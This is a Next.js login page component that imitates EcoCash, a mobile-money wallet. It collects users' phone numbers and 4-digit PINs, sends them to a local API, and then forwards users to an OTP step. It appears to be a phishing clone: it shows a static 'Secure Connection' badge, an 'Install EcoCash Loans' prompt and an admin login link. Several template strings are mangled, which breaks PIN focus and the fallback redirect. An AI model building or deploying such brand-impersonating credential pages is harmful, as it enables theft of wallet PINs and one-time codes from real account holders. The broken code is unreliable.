
"use client"

import type React from "react"
import Link from "next/link"
import { useState } from "react"
import { Eye, EyeOff, Home, ChevronDown } from "lucide-react"
import { Button } from "@/components/ui/button"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import Image from "next/image"

const COUNTRIES = [
  { code: "ZW", name: "Zimbabwe", dial: "+263", flag: "🇿🇼" },
  { code: "ZA", name: "South Africa", dial: "+27", flag: "🇿🇦" },
  { code: "BW", name: "Botswana", dial: "+267", flag: "🇧🇼" },
  { code: "ZM", name: "Zambia", dial: "+260", flag: "🇿🇲" },
  { code: "KE", name: "Kenya", dial: "+254", flag: "🇰🇪" },
]

export default function EcoCashLoginPage() {
  const [selectedCountry, setSelectedCountry] = useState(COUNTRIES[0])
  const [phoneNumber, setPhoneNumber] = useState("")
  const [pin, setPin] = useState(["", "", "", ""])
  const [showPin, setShowPin] = useState(false)
  const [loading, setLoading] = useState(false)

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    // Only allow numbers
    const value = e.target.value.replace(/\D/g, "")
    setPhoneNumber(value)
  }

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return

    const newPin = [...pin]
    newPin[index] = value.slice(-1)
    setPin(newPin)

    // Auto-focus next input
    if (value && index < 3) {
      const nextInput = document.getElementById(`pin - ${index + 1} `)
      nextInput?.focus()
    }
  }

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      const prevInput = document.getElementById(`pin - ${index - 1} `)
      prevInput?.focus()
    }
  }

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()

    // Combine country code and phone number for full format
    // Remove leading zero if user typed it (common mistake)
    const cleanPhone = phoneNumber.startsWith("0") ? phoneNumber.slice(1) : phoneNumber
    const fullPhone = `${selectedCountry.dial}${cleanPhone} `.replace(/\s/g, "")

    if (!phoneNumber || pin.some((p) => !p)) {
      alert("Please enter phone number and PIN")
      return
    }

    setLoading(true)

    try {
      const res = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "user",
          identifier: fullPhone,
          pin: pin.join("")
        }),
      })

      const data = await res.json()

      if (!res.ok) {
        throw new Error(data.error || "Login failed")
      }

      // Store phone for OTP page if needed or pass via query param
      // Redirect to OTP page with the phone number encoded
      if (data.redirect) {
        const target = new URL(data.redirect, window.location.origin)
        target.searchParams.set("phone", fullPhone)
        window.location.href = target.toString()
      } else {
        window.location.href = `/ login / otp ? phone = ${encodeURIComponent(fullPhone)} `
      }

    } catch (error) {
      console.error(error)
      alert("Login failed. Please check your credentials.")
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Top Bar */}
      <div className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
        <Link
          href="/"
          className="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors"
        >
          <Home className="w-5 h-5" />
          Home
        </Link>
        <div className="text-sm text-green-500 font-semibold">Secure Connection</div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        {/* Logo */}
        <div className="mb-12 text-center">
          <h1 className="text-5xl font-black">
            <span className="text-blue-600">Eco</span>
            <span className="text-red-600">Cash</span>
          </h1>
        </div>

        {/* Login Section */}
        <div className="w-full max-w-md">
          <h2 className="text-3xl font-bold text-gray-900 text-center mb-10">Login</h2>

          <form onSubmit={handleLogin} className="space-y-8">
            {/* Phone Number Input */}
            <div>
              <div className="relative flex items-center border-2 border-blue-500 rounded-xl overflow-hidden bg-blue-50/50">
                <DropdownMenu>
                  <DropdownMenuTrigger asChild>
                    <button type="button" className="flex items-center gap-2 px-4 py-4 bg-transparent hover:bg-black/5 transition-colors border-r border-blue-200 min-w-[120px]">
                      <span className="text-2xl">{selectedCountry.flag}</span>
                      <span className="text-gray-700 font-semibold">{selectedCountry.dial}</span>
                      <ChevronDown className="w-4 h-4 text-gray-500" />
                    </button>
                  </DropdownMenuTrigger>
                  <DropdownMenuContent align="start" className="w-[200px] bg-white border border-gray-200 shadow-xl z-50">
                    {COUNTRIES.map((country) => (
                      <DropdownMenuItem
                        key={country.code}
                        onClick={() => setSelectedCountry(country)}
                        className="gap-2 cursor-pointer py-2"
                      >
                        <span className="text-xl">{country.flag}</span>
                        <span className="font-medium flex-1">{country.name}</span>
                        <span className="text-muted-foreground">{country.dial}</span>
                      </DropdownMenuItem>
                    ))}
                  </DropdownMenuContent>
                </DropdownMenu>

                <input
                  type="tel"
                  placeholder="77 123 4567"
                  value={phoneNumber}
                  onChange={handlePhoneChange}
                  className="flex-1 px-4 py-4 text-lg bg-transparent border-none focus:outline-none placeholder-gray-400 font-medium"
                />
              </div>
            </div>

            {/* PIN Entry Section */}
            <div>
              <h3 className="text-blue-600 font-bold text-center mb-2 text-lg">Secure PIN Entry</h3>
              <p className="text-gray-600 text-center text-sm mb-6">Enter your 4-digit EcoCash PIN</p>

              <div className="flex justify-center gap-4 mb-6">
                {pin.map((digit, index) => (
                  <input
                    key={index}
                    id={`pin - ${index} `}
                    type={showPin ? "text" : "password"}
                    value={digit}
                    onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(index, e)}
                    maxLength={1}
                    className="w-16 h-16 text-3xl font-bold text-center border-2 border-gray-300 rounded-2xl focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200 bg-white"
                  />
                ))}
              </div>

              <button
                type="button"
                onClick={() => setShowPin(!showPin)}
                className="flex items-center justify-center gap-2 text-blue-600 font-semibold hover:text-blue-700 mx-auto transition-colors"
              >
                {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                {showPin ? "Hide PIN" : "Show PIN"}
              </button>

              <div className="text-center mt-4">
                <a href="#" className="text-blue-600 hover:text-blue-700 font-semibold text-sm">
                  Forgot PIN?
                </a>
              </div>
            </div>

            <Button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 text-lg rounded-xl transition-all shadow-lg shadow-blue-600/20"
            >
              {loading ? "Verifying..." : "Login"}
            </Button>
          </form>

          <div className="mt-8 text-center text-sm">
            <Link href="/admin/login" className="text-gray-400 hover:text-gray-600 transition-colors">
              Admin Login
            </Link>
          </div>
        </div>
      </div>

      {/* Wavy Divider */}
      <svg viewBox="0 0 1200 120" preserveAspectRatio="none" className="w-full h-24 text-blue-600" style={{ marginBottom: "-1px" }}>
        <path d="M0,50 Q300,0 600,50 T1200,50 L1200,120 L0,120 Z" fill="currentColor" />
      </svg>

      {/* Blue Section with App Promotion */}
      <div className="bg-blue-600 text-white px-6 py-10">
        <div className="max-w-md mx-auto text-center">
          <p className="text-sm opacity-90 mb-6">To register an EcoCash wallet or get assistance, click below</p>

          <div className="bg-gradient-to-br from-purple-500 to-purple-700 rounded-2xl p-8 shadow-xl">
            <div className="flex justify-center gap-4 mb-4 opacity-70">
              <div className="w-6 h-6 bg-white/20 rounded-full" />
              <div className="w-6 h-6 bg-white/20 rounded-full" />
              <div className="w-6 h-6 bg-white/20 rounded-full" />
            </div>

            <h3 className="text-xl font-bold mb-2">Install EcoCash Loans</h3>
            <p className="text-sm opacity-90 mb-6">Add to your home screen for quick access and better experience</p>

            <Button className="w-full bg-white text-purple-600 hover:bg-gray-100 font-bold py-3 rounded-xl transition-all">
              Install App
            </Button>
          </div>
        </div>
      </div>
    </div>
  )
}
